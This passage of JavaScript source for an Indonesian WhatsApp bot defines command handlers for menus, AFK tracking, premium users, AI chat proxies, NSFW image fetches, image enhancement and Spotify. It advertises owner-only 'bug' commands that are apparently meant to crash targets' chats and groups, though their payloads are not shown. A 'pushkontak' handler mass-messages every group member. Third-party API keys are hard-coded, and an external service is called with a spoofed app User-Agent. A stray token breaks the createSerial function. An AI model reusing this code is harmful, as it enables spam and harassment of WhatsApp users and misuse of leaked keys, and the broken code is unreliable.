		Methods.includes(method) ? (method = method) : (method = Methods[0]);
		let buffer,
			Form = new FormData(),
			scheme = "https" + "://" + "inferenceengine" + ".vyro" + ".ai/" + method;
		Form.append("model_version", 1, {
			"Content-Transfer-Encoding": "binary",
			contentType: "multipart/form-data; charset=uttf-8",
		});
		Form.append("image", Buffer.from(urlPath), {
			filename: "enhance_image_body.jpg",
			contentType: "image/jpeg",
		});
		Form.submit(
			{
				url: scheme,
				host: "inferenceengine" + ".vyro" + ".ai",
				path: "/" + method,
				protocol: "https:",
				headers: {
					"User-Agent": "okhttp/4.9.3",
					Connection: "Keep-Alive",
					"Accept-Encoding": "gzip",
				},
			},
			function (err, res) {
				if (err) reject();
				let data = [];
				res
					.on("data", function (chunk, resp) {
						data.push(chunk);
					})
					.on("end", () => {
						resolve(Buffer.concat(data));
					});
				res.on("error", (e) => {
					reject();
				});
			}
		);
	});
}
async function sendGeekzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await conn.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

var createSerial = (size) => {removebg
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await conn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {

let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 

let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Telah Kembali Dari Afk ${user.afkReason ? ' Selama ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

switch(command) {
case 'menu': {
conn.sendMessage(m.chat, { caption: menulist, document: fs.readFileSync('./image/cheems.xlsx'), mimetype: `${docs}`, fileName: `💖𝙇𝙄𝙎𝙏 𝙈𝙀𝙉𝙐 𝘽𝙊𝙏💖`,
contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `${ownername}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/8cd68dfc3fa902010e0e6.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: blue})}
                    break
case 'nsfwmenu': {
stod = `${sender}`
var mundur = await hitungmundur(4, 23)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "INR",
"amount1000": "7777777",
"requestFrom": m.sender,
"noteMessage": {
"extendedTextMessage": {
"text": `*Hay ${pushname} 👋*
${shinchantime}
Saya ©ɴᴇʀᴏʙᴏᴛ yang di buat oleh developer ${global.ownername} untuk membantu para pengguna WhatsApp
━━━━━━━━━━━━━━━━━━━
╰┈➤「 \`\`\`𝑫𝑨𝑻𝑨𝑩𝑨𝑺𝑬\`\`\` 」
━━━━━━━━━━━━━━━━━━━
_Status : ${isCreator ? 'Owner' : 'User'}_
_Nama : ${pushname}_
_Nomor : @${stod.split('@')[0]}_
_Sponsored :  @${ini_mark.split('@')[0]}_
Prefix :   ${prefix}
_Speed : ${latensii.toFixed(4)} Second_
Memory Used : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
Hostname : ${os.hostname()}
Platform : ${os.platform()}
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝑹𝑬𝑨𝑳 𝑻𝑰𝑴𝑬 )
━━━━━━━━━━━━━━━━━━━
𝐇𝐚𝐫𝐢: ${week} ${weton}
𝐓𝐚𝐧𝐠𝐠𝐚𝐥: ${date}
𝐉𝐚𝐦: ${time}
𝐉𝐚𝐦: ${wita}
𝐉𝐚𝐦: ${wit}
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝑰𝑫𝑼𝑳 𝑭𝑰𝑻𝑹𝑰 🌜 )
━━━━━━━━━━━━━━━━━━━
 ${mundur}
 Hijriah : ${dateIslamic}
━━━━━━━━━━━━━━━━━━━
╰┈➤( *NSFW MENU* )
━━━━━━━━━━━━━━━
➤ hentai [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ hneko [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ trap [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ blowjob [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ pussy [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ ecchi [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ solog [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
━━━━━━━━━━━━━━━
`,
}}}}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break
case 'grupmenu': {
stod = `${sender}`
var mundur = await hitungmundur(4, 23)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "INR",
"amount1000": "7777777",
"requestFrom": m.sender,
"noteMessage": {
"extendedTextMessage": {
"text": `*Hay ${pushname} 👋*
${shinchantime}
Saya ©ɴᴇʀᴏʙᴏᴛ yang di buat oleh developer ${global.ownername} untuk membantu para pengguna WhatsApp
━━━━━━━━━━━━━━━━━━━━━
╰┈➤「 \`\`\`𝑫𝑨𝑻𝑨𝑩𝑨𝑺𝑬\`\`\` 」
━━━━━━━━━━━━━━━━━━━━━
_Status : ${isCreator ? 'Owner' : 'User'}_
_Nama : ${pushname}_
_Nomor : @${stod.split('@')[0]}_
_Sponsored :  @${ini_mark.split('@')[0]}_
Prefix :   ${prefix}
_Speed : ${latensii.toFixed(4)} Second_
Memory Used : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
Hostname : ${os.hostname()}
Platform : ${os.platform()}
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝑹𝑬𝑨𝑳 𝑻𝑰𝑴𝑬 )
━━━━━━━━━━━━━━━━━━━
𝐇𝐚𝐫𝐢: ${week} ${weton}
𝐓𝐚𝐧𝐠𝐠𝐚𝐥: ${date}
𝐉𝐚𝐦: ${time}
𝐉𝐚𝐦: ${wita}
𝐉𝐚𝐦: ${wit}
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝑰𝑫𝑼𝑳 𝑭𝑰𝑻𝑹𝑰 🌜 )
━━━━━━━━━━━━━━━━━━━
 ${mundur}
 Hijriah : ${dateIslamic}
━━━━━━━━━━━━━━━━━━━
╰┈➤( *GROUP MENU* )
━━━━━━━━━━━━━━━━━━━
➤ welcome on / off [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ antilink on / off [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ antitoxic on / off [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ pushkontak (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ pushcontid (id group) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ bcgc (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ hidetag (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ kick (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ add (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ promote (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ demote (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendlinkgc (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ editgroup close / open [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ editinfo on / off [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ join (linknya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ editsubjek (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ editdesk (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ tagall (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ linkgroup [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ resetlinkgc [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ promoteall [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ demoteall [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ repeat [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ call [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ id [ 𝗢𝗪𝗡𝗘𝗥 ]
━━━━━━━━━━━━━━━
`,
}}}}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break

case 'bugmenu': {
stod = `${sender}`
var mundur = await hitungmundur(4, 23)
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `*Hay ${pushname} 👋*
${shinchantime}
×_×
Fitur hanya boleh di akses owner ${global.ownername}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
「 \`\`\`DATABASE\`\`\` 」
_Status : ${isCreator ? 'Owner' : 'User'}_
_Nama : ${pushname}_
_Nomor : @${stod.split('@')[0]}_
_Sponsored :  @${ini_mark.split('@')[0]}_
Prefix :   ${prefix}
_Speed : ${latensii.toFixed(4)} Second_
Memory Used : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
Hostname : ${os.hostname()}
Platform : ${os.platform()}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
( REAL TIME )
${week} ${weton}, ${date}
${time}
${wita}
${wit}
━━━━━━━━━━━━━━━━━━━━━━━━━━
( 𝑯𝑰𝑻𝑼𝑵𝑮 𝑴𝑼𝑵𝑫𝑼𝑹 𝑰𝑫𝑼𝑳 𝑭𝑰𝑻𝑹𝑰 🌜 )
 ${mundur}
 Hijriah : ${dateIslamic}
━━━━━━━━━━━━━━━━━━━━━━━━━━
  *ONLY PRIVATE CHAT* 
━━━━━━━━━━━━━━━━━━━━━━
➤ oy (Bug Call New) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbug (Bug Call) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbugtroli (Bug Troli) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbugpc (Bug Invite) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ jadikatalog (Reply Gambar/Stiker) [ 𝗢𝗪𝗡𝗘𝗥 ]
━━━━━━━━━━━
  *ONLY GRUP* 
━━━━━━━━━━━
➤ oygc (id group) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbuggc (id group) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbugtroligc (id group) [ 𝗢𝗪𝗡𝗘𝗥 ]
━━━━━━━━━━━━━━━
`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break
case 'tqto': {
stod = `${sender}`
var mundur = await hitungmundur(4, 23)
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `*Hay ${pushname} 👋*
${shinchantime}
Saya ©ɴᴇʀᴏʙᴏᴛ yang di buat oleh developer ${global.ownername} untuk membantu para pengguna WhatsApp
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
「 \`\`\`DATABASE\`\`\` 」
_Status : ${isCreator ? 'Owner' : 'User'}_
_Nama : ${pushname}_
_Nomor : @${stod.split('@')[0]}_
_Sponsored :  @${ini_mark.split('@')[0]}_
Prefix :   ${prefix}
_Speed : ${latensii.toFixed(4)} Second_
Memory Used : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
Hostname : ${os.hostname()}
Platform : ${os.platform()}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
( REAL TIME )
${week} ${weton}, ${date}
${time}
${wita}
${wit}
━━━━━━━━━━━━━━━━━━━━━━━━━━
( 𝑯𝑰𝑻𝑼𝑵𝑮 𝑴𝑼𝑵𝑫𝑼𝑹 𝑰𝑫𝑼𝑳 𝑭𝑰𝑻𝑹𝑰 🌜 )
 ${mundur}
 Hijriah : ${dateIslamic}
━━━━━━━━━━━━━━━━━━━━━━━━━━
  *THANKS BUAT TEMEN² KU* 
━━━━━━━━━━━━━━━━━━━━━
➤ Shield (Sauma)
➤ Zulfa
➤ Sawali
➤ Kreyu
➤ Ari
➤ Zimura (Indra)
➤ Bim-Bim
➤ Bang Iman
━━━━━━━━━━━━━━━
`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break

case 'datajam': {
var mundur = await hitungmundur(4, 23)
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": Date.now(),
"title": `𝙎𝙀𝙆𝘼𝙍𝘼𝙉𝙂 𝙒𝘼𝙆𝙏𝙐 𝙈𝙀𝙉𝙐𝙉𝙅𝙐𝙆𝙆𝘼𝙉
${week} ${weton}, ${date}
${time}
${wita}
${wit}
━━━━━━━━━━━━━━━━━━━━━━━━━━
( 𝑯𝑰𝑻𝑼𝑵𝑮 𝑴𝑼𝑵𝑫𝑼𝑹 𝑰𝑫𝑼𝑳 𝑭𝑰𝑻𝑹𝑰 🌜 )
 ${mundur}
 Hijriah : ${dateIslamic}
━━━━━━━━━━━━━━━
`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break
case 'shutdown':
if (!isCreator) return paycall('*Khusus Owner Bot*')
await loading()
reply(`Goodbye🖐`)
await sleep(3000)
process.exit()
break
case 'restart':
if (!isCreator) return paycall('*Khusus Owner Bot*')
await loading()
await sleep(3000)
paytod('Sukses Merestart Ulang Bot🙏\nBot Kembali Pulih Tidak Delay Lagi🥰\n\n\nNote: Jika bot mengalami on/off dengan sendirinya, itu tandanya lagi reset sessions biar tidak delay (Jadi harap di tunggu sampai bener bener dipulihkan 😁)')
await start()
break

case 'pushkontak':{
if (!isCreator) return paycall('*Khusus Owner Bot*')
if (!m.isGroup) return paycall(`di group coy`)
if (!text) return paycall(`Teks Nya Kak?`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
reply(`*Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 3} detik*`)
for (let m of mem) {
await sleep(3000)
conn.sendMessage(m, {text: `${teksnye}`}, {quoted: blue})
}
reply(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
}
break
case 'owner': case 'crator':{
 conn.sendContact(from, global.owner, blue)
}
break
case 'addprem':
if (!isCreator) return paycall('*Khusus Owner Bot*')
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 6282134110253`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await conn.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`The Number ${prrkek} Has Been Premium!`)
break
case 'delprem':
if (!isCreator) return paycall('*Khusus Owner Bot*')
if (!args[0]) return reply(`Use ${prefix+command} nomor\nExample ${prefix+command} 6282134110253`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`The Number ${ya} Has Been Removed Premium!`)
break
//========================CHAT GPT VIP=========================//
case 'ai': {
  if (!text) return paycall('Apa yang bisa saya bantu?')
  reply(global.wait)
    let error1;
try {
    let response = await fetch(`https://api.lolhuman.xyz/api/openai-turbo?apikey=haikalgans&text=${text}`)
    let data = await response.json()   
  conn.sendText(from, data.result, blue)
  } catch (er) {
					error1 = true;
				} finally {
					if (error1) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
/*case 'aijs': {
  if (!text) return paycall('Ai khusus coding javascript')
  reply(global.wait)
    let res = await fetch(`https://xzn.wtf/api/ai-code-generator?text=${text}&lang_code=javascript&apikey=nerobot`)
    let data = await res.json()   
  conn.sendMessage(m.chat, {text: `${data.response}`}, {quoted: fkontak})
}
break
case 'aipy': {
  if (!text) return paycall('Ai khusus coding Python')
  reply(global.wait)
    let res = await fetch(`https://xzn.wtf/api/ai-code-generator?text=${text}&lang_code=python&apikey=nerobot`)
    let data = await res.json()   
  conn.sendMessage(m.chat, {text: `${data.response}`}, {quoted: fkontak})
}
break*/
case 'neroai': {
if (`${global.xzn}` == 'YOUR_APIKEY_HERE') return m.reply(global.noapikey)
reply(global.wait)
  if (!text) return m.reply('Apa yang bisa saya bantu?')
  let error2;
try {
    let response = await fetch(`https://api.akuari.my.id/ai/gpt?chat=${text}`)
    let data = await response.json()
conn.sendMessage(m.chat, {text: `${data.respon}`}, {quoted: fkontak})
} catch (er) {
					error2 = true;
				} finally {
					if (error2) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
//========================WAIFU = LOLI========================//
case 'waifu': {
reply(global.wait)
let error3;
try {
            axios.get(`https://api.waifu.pics/sfw/waifu`)
               .then(({
                  data
               }) => {
                  conn.sendImage(m.chat, data.url, done, blue)
               })
               } catch (er) {
					error3 = true;
				} finally {
					if (error3) {
						replyerror("Yah Proses Gagal :(");
					}
					}
         }
         break
         case 'loli':{
         reply(global.wait)
let heyy
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
let error4;
try {
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
conn.sendMessage(m.chat, { image: { url: yeha }, caption : done }, { quoted: blue })
} catch (er) {
					error4 = true;
				} finally {
					if (error4) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
//========================NSFW=========================//
         case 'hentai' :
if (!isPrem) return replyprem(mess.premium)
reply(global.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: fkontak })
break
case 'hneko' :
if (!isPrem) return replyprem(mess.premium)
reply(global.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: fkontak })
break
case 'trap' :
if (!isPrem) return replyprem(mess.premium)
reply(global.wait)
    waifudd = await axios.get(`https://waifu.pics/nsfw/trap`)
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: fkontak })
break
case 'blowjob' :
if (!isPrem) return replyprem(mess.premium)
reply(global.wait)
    waifudd = await axios.get(`https://waifu.pics/nsfw/blowjob`)
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: fkontak })
break
case 'pussy' :
if (!isPrem) return replyprem(mess.premium)
reply(global.wait)
let error5;
try {
conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random2/${command}?apikey=${apikey}` } })
} catch (er) {
					error5 = true;
				} finally {
					if (error5) {
						replyerror("Yah Proses Gagal :(");
					}
					}
break
case 'ecchi' :
if (!isPrem) return replyprem(mess.premium)
reply(global.wait)
let error6;
try {
conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${apikey}` } })
} catch (er) {
					error6 = true;
				} finally {
					if (error6) {
						replyerror("Yah Proses Gagal :(");
					}
					}
break
case 'solog' :
if (!isPrem) return replyprem(mess.premium)
reply(global.wait)
let error7;
try {
conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random2/${command}?apikey=${apikey}` } })
} catch (er) {
					error7 = true;
				} finally {
					if (error7) {
						replyerror("Yah Proses Gagal :(");
					}
					}
break
//========================REMINI=========================//
case 'remini': {
			if (!/image/.test(mime)) return paycall(`Send/Reply Foto Dengan Caption ${prefix + command}`)
			reply(global.wait)
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			conn.sendMessage(m.chat, { image: proses, caption: `𝑭𝒐𝒕𝒐 𝒅𝒂𝒉 𝒋𝒂𝒅𝒊 𝑯𝑫 𝒃𝒍𝒐𝒎 𝒃𝒂𝒏𝒈? \n𝑩𝒚: 𝑺𝒉𝒊𝒏𝑪𝒉𝒂𝒏 𝑺𝒆𝒏𝒑𝒂𝒊🐼❤️`}, { quoted: blue})
			}
			break
case '4k': {
if (!/image/.test(mime)) return paycall(`Send/Reply Foto Dengan Caption ${prefix + command}`)
reply(global.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted);
let anu = await TelegraPh(media)
let error8;
try {
let response = await fetch(`https://api.betabotz.org/api/tools/remini-v3?url=${anu}&resolusi=4&apikey=hYnG4TVp`)
let data = await response.json()
await conn.sendMessage(m.chat, { image: data.url, caption: `𝑭𝒐𝒕𝒐 𝒃𝒆𝒓𝒉𝒂𝒔𝒊𝒍 𝒅𝒊 𝒆𝒏𝒉𝒂𝒏𝒄𝒆 𝒌𝒆 4𝑲\n𝑩𝒚: 𝑺𝒉𝒊𝒏𝑪𝒉𝒂𝒏 𝑺𝒆𝒏𝒑𝒂𝒊🐼❤️`}, { quoted: blue})
} catch (er) {
					error8 = true;
				} finally {
					if (error8) {
						replyerror("Yah Proses Gagal :(");
					}
					}
			}
			break
/*case 'hd': {
if (!isPrem) return replyprem(mess.premium)
const alias = {
    "hd" : "torch-srgan",
  };
  const aliasCommand = alias[command] || command;
  if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }

  if (!/video/.test(mime) && !/image/.test(mime)) {
    throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`;
  }

  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
  let error;
try {
  let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    reply(global.wait);

    const response = `https://xzn.wtf/api/waifu2x?url=${anu}&apikey=nerobot`

    conn.sendMessage(from, { image: { url: response }, caption: '𝑭𝒐𝒕𝒐 𝒃𝒆𝒓𝒉𝒂𝒔𝒊𝒍 𝒅𝒊 𝒆𝒏𝒉𝒂𝒏𝒄𝒆 𝒌𝒆 4𝑲\n𝑩𝒚: 𝑺𝒉𝒊𝒏𝑪𝒉𝒂𝒏 𝑺𝒆𝒏𝒑𝒂𝒊🐼❤️' }, { quoted: fkontak });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						reply("Proses Gagal :(");
					}
					}
					}
break*/
//========================REMOVE BAGROUND=========================//
case 'removebg': {
  if (!/video/.test(mime) && !/image/.test(mime)) {
    throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`;
  }

  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
  let error;
try {
  let media = await conn.downloadAndSaveMediaMessage(quoted);
  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    reply(global.wait);
    const response = `https://api.lolhuman.xyz/api/removebg?apikey=haikalgans&img=${anu}`
    

    conn.sendMessage(from, { image: { url: response }, caption: done }, { quoted: fkontak });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						reply("Proses Gagal :(");
					}
					}
					}
break
//=========================================================//
/*case 'imgeditor': {
  if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }
  if (!isPrem) return replyprem(mess.premium)
if (!text) return m.reply(`Reply image with ${command} blue eyes with cute face and white skin`)
let error;
try{
  if (!/image/.test(mime)) {
    throw `*Send/Reply the Image With Caption* ${prefix + command}`;
  }
  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
  
  let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    m.reply(global.wait);

    let response = `https://xzn.wtf/api/image-editor?url=${anu}&text=${text}&apikey=nerobot`
    conn.sendMessage(from, { image: { url: response}, caption: 'nih' }, { quoted: fkontak });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						m.reply("Proses Gagal :(");
					}
					}
					}
break
case 'jojo':
case 'anime2d':
case 'cartoon3d':
case 'pretty':
case 'romancecomic':
case 'maid':
case 'superhero':
case 'watercolor':
case 'doodle':
case 'americacomic':
case 'starrygirl': {
  const alias = {
    "anime2d": "anime_2d",
    "cartoon3d": "cartoon_3d",
    "pretty": "pretty_soldier",
    "jojo": "bizarre",
    "maid": "maid_dressing",
    "romancecomic": "romance_comic",
    "superhero": "superhero_comic",
    "watercolor": "watercolor",
    "doodle": "doodle",
    "americancomic": "america-comic",
    "starrygirl": "starry_girl"
  };
  const aliasCommand = alias[command] || command;
  if (!isPrem) return replyprem(mess.premium)

  if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }

  if (!/video|image/.test(mime)) {
    throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`;
  }

  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
let error;
try {
  let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    reply(global.wait);

    const response = await fetchJson(`https://xzn.wtf/api/aimirror?&apikey=nerobot&url=${anu}&filter=${aliasCommand}`);
   
    conn.sendMessage(from, { image: { url: response.generated_image_addresses[0] }, caption: 'nih' }, { quoted: fkontak });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						reply("Proses Gagal :(");
					}
					}
					}
break
case 'textimg' : {
if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }

if (!isPrem) return replyprem(mess.premium)
if (!text) return m.reply(`${command} smile face with blush and blue hair`)
    const response = await fetchJson(`https://xzn.wtf/api/midjourney?text=${text}&apikey=nerobot`);
   if (response.status == 'FAILURE') return m.reply('gagal')
   let error;
   try {
    conn.sendMessage(from, { image: { url: response.imageUrl }, caption: 'nih' }, { quoted: fkontak });
  }catch (er) {
					error = true;
				} finally {
					if (error) {
						m.reply("Proses Gagal :(");
					}
					}
					}
  //END AI MENU
break*/
//========================SPOTIFY=========================//
case 'spotifysearch': {
if (!text) throw `*🚩 Contoh:* ${usedPrefix + command} Lathi`;  
  let teks = '';
let error18;
try {
    const api = await fetch(`https://api.betabotz.org/api/search/spotify?query=${text}&apikey=hYnG4TVp`);
    let json = await api.json();
    let res = json.result.data;    
    for (let i in res) {
      teks += `*${parseInt(i) + 1}.* *Title:* ${res[i].title}\n`;
      teks += `*Duration:* ${res[i].duration}\n`;
      teks += `*Popularity:* ${res[i].popularity}\n`;
      teks += `*Link:* ${res[i].url}\n\n`;
    }
     } catch (er) {
					error18 = true;
				} finally {
					if (error18) {
						replyerror("Yah Proses Gagal :(");
					}
					}
spotifyreply(teks)
}
break
case "spotify":{
if (!text) return paycall(`Di mana tautannya?`)
reply(global.wait)
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) return paytod(`The link you provided is not spotify link`)
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `🐼 *Title:* ${name || ''}\n🐼 *Artists:* ${(artists || []).join(
            ','
        )}\n🐼 *Album:* ${album_name}\n🐼 *Release Date:* ${release_date || ''}`
       const response = await conn.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: fkontak })
        const bufferpotify = await spotify.download()
        await conn.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
        }
break
//========================TIKTOK=========================//
case 'tiktoknowm': case 'ttnowm': case 'tiktok': case 'tt': {
if (!args[0]) return paycall( `Example : ${prefix + command} link`)
reply(global.wait)
let error9;
try {
